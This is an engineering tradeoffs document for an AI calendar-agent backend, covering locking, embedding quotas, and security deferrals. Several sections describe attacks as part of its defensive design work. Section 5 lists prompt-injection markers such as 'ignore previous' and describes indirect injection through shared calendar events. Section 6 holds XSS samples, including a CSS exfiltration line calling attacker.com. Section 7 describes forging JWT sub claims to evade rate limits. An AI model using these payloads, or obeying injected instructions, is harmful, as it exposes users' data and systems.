# Tradeoffs & Deferred Decisions

Decisions where we chose the simpler MVP path with a known upgrade path for later.

---

## 1. Token Refresh Lock — In-Memory vs Distributed

**Date:** 2026-03-15
**Issue:** #17 (Calendar Tools)
**File:** `backend/app/agents/tools/calendar_tools.py`

### The problem

When a user's Google OAuth access token expires, the agent refreshes it before calling the Calendar API. If two concurrent tool calls for the same user both detect the expired token, both attempt a refresh — a race condition.

### What we built (MVP)

Per-user `asyncio.Lock` with a double-check pattern, stored in a bounded `OrderedDict` with LRU eviction (maxsize=1024, added in #100):

```python
_REFRESH_LOCK_MAXSIZE = 1024
_refresh_locks: OrderedDict[str, asyncio.Lock] = OrderedDict()

async def _get_credentials(user_id):
    stored = await get_token(user_id)
    if stored.expires_at < time.time() + 60:
        async with _get_refresh_lock(user_id):
            # Re-check — another coroutine may have refreshed
            stored = await get_token(user_id)
            if stored.expires_at < time.time() + 60:
                stored = await _refresh_token_for_tool(user_id, stored)
```

If a lock is evicted while held (extremely unlikely at 1024 capacity), a concurrent refresh for the same user may run in parallel — harmless since the refresh operation is idempotent.

### Why this is sufficient for now

- MVP runs a single Container App replica (one Python process)
- `asyncio.Lock` serializes all coroutines within that process
- Even without the lock, the race is benign — both refreshes succeed and whichever `store_token` runs last stores a valid token
- Bounded at 1024 entries prevents memory leaks in long-running processes

### When this breaks

Multiple backend replicas (horizontal scaling). Each replica has its own memory, so Process 1's lock is invisible to Process 2:

```
Process 1: sees expired → acquires local lock → refreshes → stores
Process 2: sees expired → acquires local lock → refreshes → stores (overwrites)
```

Both succeed, but if Google rotates the refresh token, the overwritten token from Process 1 is lost. The stored token (from Process 2) is still valid, so no immediate failure — but it's wasteful and could cause subtle issues under high concurrency.

### The upgrade path — Redis distributed lock

Use Redis `SETNX` (atomic set-if-not-exists) as the coordination layer since Redis is already shared across all replicas:

```python
# Conceptual — would use redis.lock.Lock in practice
lock_key = f"lock:token_refresh:{user_id}"
acquired = await redis.set(lock_key, "1", nx=True, ex=10)  # 10s TTL
if acquired:
    try:
        # refresh token
    finally:
        await redis.delete(lock_key)
else:
    # wait briefly, then re-read token from Redis (now fresh)
```

Key details:
- `nx=True` — only one caller wins the lock
- `ex=10` — auto-release after 10s prevents deadlocks if the holder crashes
- `redis.lock.Lock` from the `redis` library handles this pattern with retry/backoff built in

### Trigger to upgrade

- Scaling to 2+ backend replicas
- Observing duplicate refresh calls in logs (`"Token refresh failed"` or `"Token refresh network error"` for the same user at the same timestamp)

---

## 2. Ingestion Sync Lock — None vs Distributed

**Date:** 2026-03-16
**Issue:** #92 (Embedding Pipeline Batching)
**File:** `backend/app/context_ingestion/tasks.py`

### The problem

When a user logs in, `run_ingestion()` is enqueued as a FastAPI BackgroundTask. If the same user logs in from two browser tabs simultaneously, both tasks pass the cooldown check (which reads Redis but doesn't lock) and both call `full_ingest()` — doubling the embedding API calls and TPM consumption.

### What we built (MVP)

No lock. The cooldown check in `run_ingestion()` uses `get_sync_metadata()` to read the last-ingested timestamp from Redis, but the check-then-act sequence is not atomic. Two concurrent tasks can both see "cooldown elapsed" and proceed.

### Why this is sufficient for now

- Upsert semantics (`merge_or_upload_documents`) make concurrent writes safe — whichever finishes last simply overwrites with the same data
- No data corruption or orphaned documents
- The only cost is redundant Azure OpenAI embedding calls (TPM waste)
- With the new batching + exponential backoff (#92), even redundant calls complete gracefully instead of crashing

### When this breaks

- High-traffic periods where many users log in simultaneously
- Multiple backend replicas (each runs its own background tasks)
- Low TPM quotas where redundant calls cause cascading 429 retries

### The upgrade path — Redis distributed lock

Same pattern as the token refresh lock (Tradeoff #1):

```python
lock_key = f"lock:ingestion:{user_id}"
acquired = await redis.set(lock_key, "1", nx=True, ex=600)  # 10min TTL
if acquired:
    try:
        await full_ingest(user_id)
    finally:
        await redis.delete(lock_key)
else:
    logger.info("Ingestion already running for user %s, skipping", user_id)
```

Key details:
- `ex=600` — TTL matches max expected full ingest duration (10 minutes for 500+ events at 10K TPM)
- If the holder crashes, the lock auto-releases after TTL
- Skipping (not queuing) is the right behavior — next login will trigger a delta sync

### Trigger to upgrade

- Observing duplicate `"Starting full ingest for user X"` logs at the same timestamp
- Scaling to 2+ backend replicas
- Frequent 429 retries in logs when TPM quota is tight

---

## 3. Embedding Token Budget Tracking — Reactive vs Proactive

**Date:** 2026-03-16
**Issue:** #92 (Embedding Pipeline Batching)
**File:** `backend/app/search/embeddings.py`

### The problem

The embedding pipeline has no visibility into how many tokens it consumes per batch. It only learns about TPM limits when Azure returns a 429 error, then reacts with exponential backoff. This is wasteful — each 429 response adds 1-60 seconds of retry delay.

### What we built (MVP)

Reactive rate limit handling:
- Batch events into groups of 50 (configurable)
- 1-second delay between batches (configurable)
- Exponential backoff with retry on 429 (respects `Retry-After` header)
- Progress logging per batch

### Why this is sufficient for now

- 10K TPM allows ~2.5 batches/minute of 50 short events (~80 tokens each)
- The `Retry-After` header tells us exactly when to retry
- Full ingest for a typical user (200-300 events) completes in 2-5 minutes
- Backoff adds latency but doesn't cause data loss (background task, idempotent)

### When this breaks

- Events with long descriptions (meeting transcripts, agendas) consume 300-500 tokens each — 50-event batch could hit 25K tokens, exhausting 10K TPM in one call
- Multiple users ingesting simultaneously share the same TPM quota
- Users notice slow first-login experience due to repeated 429 retries

### The upgrade path — Proactive token estimation

Estimate tokens before sending each batch and pace requests to stay within budget:

```python
# chars/4 is a reasonable heuristic for English text → tokens
estimated_tokens = sum(len(text) for text in batch_texts) // 4
tokens_per_minute = settings.azure_openai_tpm_limit  # e.g. 10_000

# Track cumulative usage in a sliding window
if cumulative_tokens + estimated_tokens > tokens_per_minute:
    wait = 60 - elapsed_since_window_start
    await asyncio.sleep(wait)
    reset_window()
```

Key details:
- `chars/4` heuristic is ~80% accurate for English text
- Sliding window tracks tokens consumed in the current minute
- Proactive delay avoids 429 entirely — no wasted retry cycles
- Could also use `tiktoken` for exact counts (adds ~1ms per batch)

### Trigger to upgrade

- Frequent 429 retries visible in batch progress logs (e.g., `"retrying in 30.0s"`)
- User complaints about slow first-login experience
- TPM quota increase is not an option (cost or policy constraint)

---

## 4. Embedding Cost & TPM Scaling — Redis as Sync Token Store

**Date:** 2026-03-16
**Issue:** #92 (Embedding Pipeline Batching)
**Files:** `backend/app/context_ingestion/sync.py`, `backend/app/search/embeddings.py`

### Baseline numbers (real measurement)

Single user calendar: **162 events, 143.73K tokens, ~4 batches of 50**

- Average tokens per event: ~887
- Embedding model: `text-embedding-3-small` ($0.02 / 1M tokens)
- Cost per full ingest: **$0.0029**

### Cost at scale

| Users | Full ingest tokens | Cost | Notes |
|-------|--------------------|------|-------|
| 1 | 143.73K | $0.003 | Your calendar |
| 10 | 1.44M | $0.03 | Small team |
| 100 | 14.4M | $0.29 | Department |
| 1,000 | 144M | $2.88 | Organization |

Embeddings are cheap. **The real constraint is TPM (tokens per minute)**, not dollars.

### TPM bottleneck

Azure OpenAI enforces TPM quotas per deployment:

| Tier | TPM limit | Full ingests/min (at 144K tokens each) |
|------|-----------|----------------------------------------|
| S0 default | 240K | 1.6 users |
| S0 increased | 1M | 6.9 users |
| Provisioned | 10M | 69 users |

Delta sync (typically ~5 changed events, ~4.4K tokens) is **~33x cheaper** than full ingest per login. The sync token in Redis is what enables delta sync — losing it forces a full re-ingest.

### What we built (MVP)

Sync tokens live in Redis only. If Redis data is lost:

1. `get_sync_metadata()` returns `None` for every user
2. Every login triggers `full_ingest()` instead of `delta_sync()`
3. All users compete for the same TPM quota simultaneously

### The re-ingest storm

If Redis dies and N users log in:

| Users | Tokens needed | Time at 240K TPM | Time at 1M TPM | Time at 10M TPM |
|-------|---------------|-------------------|-----------------|-----------------|
| 10 | 1.44M | 6 min | 1.4 min | 9 sec |
| 100 | 14.4M | 60 min | 14.4 min | 1.4 min |
| 1,000 | 144M | 10 hours | 2.4 hours | 14.4 min |

With batching + exponential backoff, this degrades gracefully (no crashes, just slow). Each user takes 6-8 seconds without rate limits, 30-120 seconds with backoff retries.

### Why this is sufficient for now

- Azure Cache for Redis (managed) has 99.9% SLA — full data loss is rare
- At MVP scale (1-10 users), a re-ingest storm is 1.44M tokens / ~$0.03 / ~6 minutes
- The metadata-before-ingest fix (#92) prevents the worst case: a partial embedding failure no longer triggers infinite full re-ingest loops on every login attempt
- Delta sync reduces the steady-state cost to near-zero (~5 events per login)

### When this breaks

- **10+ concurrent users** after Redis loss: 240K TPM is exhausted by user #2, cascading 429 retries for the rest
- **100+ users**: recovery takes over an hour at default TPM, login experience is degraded for everyone
- **Multi-replica deployments**: each replica independently triggers ingestion, multiplying TPM consumption

### The upgrade path — Durable sync token storage

Move sync tokens from Redis-only to a durable store so Redis loss doesn't trigger mass re-ingestion:

**Option A: Metadata document in Azure AI Search**

Store the sync token as a document in the search index itself (already durable, already available):

```python
# On sync completion
await upsert_documents(user_id, [{
    "id": f"sync_meta:{user_id}",
    "user_id": user_id,
    "source_type": "sync_metadata",
    "content": "",
    "embedding": [0.0] * 1536,  # zero vector (not searchable)
    "sync_token": sync_token,
    "last_modified": datetime.now(UTC).isoformat(),
}])
```

Recovery flow: Redis miss → query search index for metadata doc → found → delta sync.

**Option B: Recover from search index `last_modified`**

If the user has documents in the index, use the most recent `last_modified` timestamp with Google Calendar's `updatedMin` parameter to fetch only changes since the last upsert and obtain a fresh sync token:

```python
# Redis miss, but user has indexed documents
latest_doc = await search(user_id, query="*", order_by=["last_modified desc"], top=1)
if latest_doc:
    updated_min = latest_doc["last_modified"]  # minus safety margin
    events, sync_token = await fetch_events(updatedMin=updated_min)
    # Process only the delta, store fresh sync token
```

Caveats: `updatedMin` can't combine with `timeMin`/`timeMax`, so this returns changes across the entire calendar history. Also requires subtracting a safety margin since our `last_modified` is upsert time, not Google's modification time.

**Option C: PostgreSQL (when added for other reasons)**

If the architecture adds Postgres for user profiles or other durable state, sync tokens naturally belong there alongside other per-user metadata.

### Scaling strategy summary

| Scale | Strategy | Monthly cost | TPM needed |
|-------|----------|--------------|------------|
| 1-10 users | Current design (Redis-only sync tokens) | ~$0 | 240K (default) |
| 10-100 users | Ingestion queue + sync token recovery from search index | $1-3 | 1M |
| 100-1,000 users | Priority queue (delta before full ingest) + provisioned throughput | $3-30 | 10M+ |
| 1,000+ users | Dedicated embedding deployment per region, async job queue, durable sync token store | $30+ | Multi-deployment |

### Trigger to upgrade

- Redis failover event causes visible re-ingest storm (mass `"Starting full ingest"` logs)
- Scaling beyond 10 active users
- Moving to multi-replica deployment where Redis persistence becomes critical

---

## 5. Prompt Injection Defense — Regex-Only vs Azure Prompt Shields

**Date:** 2026-03-17
**Audit finding:** W10
**File:** `backend/app/agents/guardrails.py`

### The problem

The SPEC defines the input guard as "Prompt Shields + regex." Azure Prompt Shields is Microsoft's dedicated ML model for detecting direct and indirect prompt injection attacks. The current implementation uses regex pattern matching for injection detection and Azure Content Safety harm categories (HATE, SELF_HARM, SEXUAL, VIOLENCE) for content moderation — but these are different APIs serving different purposes. Harm categories detect toxic content, not injection attempts.

### What we built (MVP)

Two-layer input defense:
1. **Regex patterns** — detect common injection markers (`ignore previous`, `system:`, delimiter sequences, role-play attempts, canary token leakage)
2. **Azure Content Safety** — blocks harmful content (hate, self-harm, sexual, violence) via the `analyze_text` API

The output guard also uses Content Safety to filter agent responses.

### Why this is sufficient for now

- The sandwich defense prompt pattern (system → user → system reminder) provides structural protection independent of the input guard
- Regex catches the most common injection patterns (instruction overrides, role hijacking)
- The agent is scoped to calendar operations with bounded tools — even a successful injection can only call `search_events`, `create_event`, `update_event`, `delete_event` (all gated by human-in-the-loop confirmation for writes)
- Canary token detection catches extraction attempts
- The attack surface is limited: single-user context, no cross-user data access (user_id filter enforced)

### When this breaks

- Sophisticated indirect injection via calendar event descriptions (e.g., a shared calendar event containing crafted instructions)
- Adversarial users who iterate on bypassing regex patterns
- Compliance requirements that mandate ML-based injection detection
- Adding tools with broader capabilities (email send, file access) that increase the blast radius of a successful injection

### The upgrade path — Azure Prompt Shields

Prompt Shields is available on the same Content Safety resource already deployed. The API call is similar to the existing `analyze_text`:

```python
from azure.ai.contentsafety.models import AnalyzeTextOptions

# Current: harm category detection
result = client.analyze_text(AnalyzeTextOptions(text=user_input))

# Addition: prompt injection detection
# Uses the same client, same endpoint, different API
shield_result = client.analyze_text(
    AnalyzeTextOptions(
        text=user_input,
        categories=[],  # skip harm categories
        output_type="EightSeverityLevels",
    )
)
# Or use the dedicated Prompt Shields endpoint:
# POST {endpoint}/text/shieldPrompt?api-version=2024-09-01
```

Key details:
- **No new Azure resource** — uses the existing Content Safety deployment
- **~50ms additional latency** per message (runs in parallel with existing harm check)
- **No new RBAC roles** — the backend identity already has `Cognitive Services User` on Content Safety
- Can run both checks concurrently with `asyncio.gather` to minimize latency impact

### Trigger to upgrade

- Evidence of injection attempts bypassing regex (visible in logs from the `input_guard` node)
- Adding tools with higher blast radius (email, file access)
- Moving toward multi-tenant or enterprise deployment
- Security audit or compliance review requiring ML-based injection defense

---

## 6. Untrusted Content in Confirmation Cards — React Escaping Only

**Date:** 2026-03-17
**Issue:** #101 (Confirmation Card)
**Files:** `frontend/src/components/chat/ConfirmationCard.tsx`, `frontend/src/lib/format-confirmation.ts`, `backend/app/agents/router.py`

### The problem

The confirmation card renders data that originates from two untrusted sources:

1. **User's calendar (indirect injection):** The agent calls `search_events` to read existing events, then may propose an update or deletion. The event `summary`, `description`, `location`, and `attendees` come from Google Calendar — which includes events shared by other people. A malicious actor could share a calendar event containing `<script>alert('xss')</script>` in the title or `[Click here](javascript:void)` in the description. When the agent proposes modifying that event, the malicious content flows into the confirmation card.

2. **LLM output (prompt injection):** If the LLM is manipulated (via indirect prompt injection from event descriptions or direct user input), it could propose creating an event whose fields contain malicious payloads. The tool's `interrupt()` call passes whatever the LLM generated — `summary`, `description`, `location` — directly into the SSE confirmation event.

In both cases, the data path is: **Google Calendar API → agent tool → `interrupt(event_details)` → SSE `confirmation` event → `useChat` state → `ConfirmationCard` render**. No layer in this chain performs explicit sanitization.

### What we built (MVP)

No sanitization at any layer. The confirmation card relies entirely on React's default JSX text escaping:

```tsx
// ConfirmationCard.tsx — values rendered as text nodes
<dd>{field.value}</dd>

// format-confirmation.ts — values passed through as strings
fields.push({ label: "Event", value: details["summary"] });
fields.push({ label: "Description", value: details["description"] });
```

React's JSX interpolation (`{expression}`) creates text nodes, not HTML. A malicious `<script>alert('xss')</script>` renders as the literal string `<script>alert('xss')</script>` in the DOM — the browser never parses it as markup.

### Why this is sufficient for now

- **React auto-escaping is robust.** JSX text interpolation has been React's primary XSS defense since React 0.x. It escapes `<`, `>`, `&`, `"`, and `'` in text content. This is not a hack or workaround — it's a deliberate security feature of the framework.
- **No dangerous rendering patterns exist.** The component uses no `dangerouslySetInnerHTML`, no dynamic `href`/`src` attributes, no `eval()`, no CSS injection vectors. Values are only ever rendered as `<dd>` text content.
- **The attack surface is bounded.** Even if rendering were somehow bypassed, the confirmation card is a local UI element — it can't exfiltrate data to a third party unless the attacker also controls a network endpoint, which requires a separate vulnerability.
- **Write operations require explicit user approval.** The confirmation card is the human-in-the-loop gate. A user seeing `<script>alert('xss')</script>` in an event title would reject it. The malicious content is visible, not hidden.

### When this breaks

1. **Markdown or rich text rendering.** If anyone adds a Markdown renderer (e.g., `react-markdown`) or `dangerouslySetInnerHTML` to format event descriptions with line breaks, links, or bold text, the XSS protection disappears immediately. This is the most likely regression path — a developer adds "just a simple Markdown renderer" for better formatting without realizing the content is untrusted.

2. **Link rendering from event data.** If attendee emails become `mailto:` links, or locations become Google Maps links constructed from event data, an attacker could inject `javascript:` URIs or crafted URLs that redirect to phishing pages.

3. **CSS injection.** If event data is ever used in `style` attributes or CSS custom properties (e.g., color-coding events by category), an attacker could inject CSS that overlays fake UI elements or exfiltrates data via `background-image: url(attacker.com/steal?data=...)`.

4. **Server-side rendering context.** If the confirmation card is ever rendered server-side (SSR) outside React's JSX context — for example, in an email notification or a Slack webhook — the auto-escaping doesn't apply and the raw HTML would be interpreted.

### The upgrade path — Explicit sanitization at the boundary

Add sanitization where untrusted data enters the frontend, so safety doesn't depend on every future developer remembering that React escaping is the only defense:

**Option A: Sanitize in the SSE event handler (recommended)**

Strip HTML from confirmation details as they arrive, before they enter React state:

```typescript
// lib/sanitize.ts
function stripHtml(input: string): string {
  // Replace HTML tags, then decode entities for display
  return input.replace(/<[^>]*>/g, "").replace(/&[a-z]+;/gi, " ");
}

// hooks/useChat.ts — in handleEvent()
case "confirmation": {
  const sanitized = Object.fromEntries(
    Object.entries(event.details).map(([k, v]) => [
      k,
      typeof v === "string" ? stripHtml(v) : v,
    ]),
  );
  dispatch({
    type: "CONFIRMATION_RECEIVED",
    confirmation: { ...event, details: sanitized, status: "pending" },
  });
}
```

This protects all downstream rendering regardless of future component changes.

**Option B: Sanitize on the backend before SSE emission**

Strip HTML in `_stream_response()` when building the confirmation event, so the frontend never sees raw HTML:

```python
import re

def _strip_html(text: str) -> str:
    return re.sub(r"<[^>]*>", "", text)

# In _stream_response(), when building the confirmation event:
sanitized = {
    k: _strip_html(v) if isinstance(v, str) else v
    for k, v in interrupt_value.items()
}
confirmation_event = {
    "type": "confirmation",
    "action": sanitized["action"],
    "action_id": action_id,
    "details": sanitized,
}
```

**Option C: Use DOMPurify (if rich text is needed later)**

If event descriptions need to support formatting:

```typescript
import DOMPurify from "dompurify";

// Allow safe inline formatting only
const clean = DOMPurify.sanitize(description, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "br"],
  ALLOWED_ATTR: [],
});
```

### Trigger to upgrade

- Any PR that adds Markdown rendering, `dangerouslySetInnerHTML`, or link rendering to chat components
- Adding email/Slack notifications that render event data outside React
- Security audit or pen test that flags the lack of explicit sanitization
- Evidence of calendar events with HTML/script payloads in production logs

---

## 7. Rate-Limit Key — Unverified JWT Sub vs Verified User ID

**Date:** 2026-03-17
**Issue:** #100 (Rate Limiter + Bounded Locks)
**File:** `backend/app/core/middleware.py`

### The problem

SPEC requires 20 requests/minute per authenticated user on the chat endpoint. slowapi's `key_func` runs synchronously before FastAPI dependency injection, so we can't call the async `get_current_user` (which verifies the JWT signature against Google's public keys) to get a verified user ID for the rate-limit bucket.

### What we built (MVP)

`get_user_from_token` extracts the `sub` claim from the JWT payload via base64 decoding — no signature verification. Falls back to IP address (`get_remote_address`) when the token is missing, malformed, or lacks a `sub` claim.

```python
def get_user_from_token(request: Request) -> str:
    """Decode JWT payload for sub claim; fall back to IP."""
    try:
        auth = request.headers.get("authorization", "")
        token = auth[7:]  # strip "Bearer "
        payload = base64url_decode(token.split(".")[1])
        sub = json.loads(payload).get("sub")
        return sub if isinstance(sub, str) and sub else get_remote_address(request)
    except Exception:
        return get_remote_address(request)
```

### The concern — forged sub claim for bucket rotation

An attacker can craft a three-part Bearer token with an arbitrary `sub` claim (e.g., `"attacker-1"`, `"attacker-2"`) to get a separate rate-limit bucket per forged identity, sidestepping the 20/min per-user limit.

### Why this is sufficient for now

1. **Auth still rejects the request.** `Depends(get_current_user)` verifies the JWT signature after the rate-limit check. A forged token always results in 401 — the attacker never reaches the agent.
2. **The rate-limit counter still increments.** slowapi counts the request before the handler runs. After 20 forged requests as `"attacker-1"`, that bucket is exhausted — the attacker must rotate to a new fake sub.
3. **Auth verification is cheap.** Google's signing cert is cached locally via `CacheControl(requests.Session())` for ~5.5 hours. Subsequent verifications are CPU-only (~1-5ms), no network call.
4. **The global 60/min default also applies.** Even rotating sub values, all requests from the same IP share the global limiter. An attacker can't exceed 60 failed auth attempts per minute per IP.
5. **No data exfiltration.** The attacker gains nothing — no access to the chat endpoint, no calendar data, no side effects. The only cost is wasted CPU on signature verification (~5ms × 60 requests = ~300ms/min per attacking IP).

### When this breaks

- Distributed bot farm (many IPs) making unauthenticated probing requests — the per-user limit becomes meaningless since each forged sub gets its own bucket, and each IP gets 60/min of failed auth attempts
- Compliance requirement for verified-identity rate limiting (e.g., SOC 2 audit)
- Moving the chat endpoint behind a public API gateway without additional rate limiting at the gateway level

### The upgrade path — Verified user ID in middleware

Set a verified `user_id` on `request.state` in a custom middleware that runs before slowapi, then read it in the key function:

```python
# Middleware (runs before SlowAPI)
class AuthStateMiddleware:
    async def dispatch(self, request, call_next):
        try:
            user = await verify_token(request)
            request.state.verified_user_id = user.id
        except Exception:
            request.state.verified_user_id = None
        return await call_next(request)

# Key function
def get_rate_limit_key(request: Request) -> str:
    user_id = getattr(request.state, "verified_user_id", None)
    return user_id if user_id else get_remote_address(request)
```

Key details:
- Adds ~1-5ms latency per request (cached cert verification) — acceptable for auth endpoints
- Requires restructuring middleware order: Auth State → SlowAPI → CORS
- Eliminates the forged sub bypass entirely
- Falls back to IP for unauthenticated requests (login, health check, etc.)

### Trigger to upgrade

- Evidence of distributed probing (many IPs with failed auth) visible in logs
- SOC 2 or similar compliance audit requiring verified-identity rate limiting
- Adding a public API surface beyond the Next.js frontend proxy
